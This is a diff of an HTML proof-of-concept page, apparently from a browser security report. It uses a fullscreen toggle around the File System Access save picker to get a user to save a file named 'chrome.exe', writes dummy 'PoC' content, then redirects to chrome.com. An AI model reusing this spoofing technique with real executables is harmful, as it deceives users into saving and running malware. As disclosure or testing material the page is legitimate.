@@ -1,49 +1,20 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC</title>
-</head>
-<body>
-
-<h1>Click anywhere</h1>
+<!doctype html>
+<h1>Click to start</h1>
 
 <script>
 document.addEventListener('click', async () => {
-    if (!('showSaveFilePicker' in window)) return;
+    await document.documentElement.requestFullscreen();
 
-    try {
-        // 1. Save File Picker (Google / Chrome native)
-        const handle = await window.showSaveFilePicker({
-            suggestedName: 'chrome.exe',
-            types: [{
-                description: 'Executable File (PoC)',
-                accept: {
-                    'application/octet-stream': ['.exe']
-                }
-            }]
-        });
+    const handle = await showSaveFilePicker({
+        suggestedName: 'chrome.exe'
+    });
 
-        // 2. Write dummy content
-        const writable = await handle.createWritable();
-        await writable.write(
-            'PoC ONLY\r\n' +
-            'This is NOT a real executable\r\n' +
-            'Demonstration file'
-        );
-        await writable.close();
+    await document.exitFullscreen();
 
-        // 3. Redirect setelah selesai
-        setTimeout(() => {
-            window.location.assign('https://www.google.com/');
-        }, 500);
+    const w = await handle.createWritable();
+    await w.write('PoC');
+    await w.close();
 
-    } catch (e) {
-        // user cancel = expected
-    }
+    location.assign('https://www.chrome.com');
 }, { once: true });
 </script>
-
-</body>
-</html>
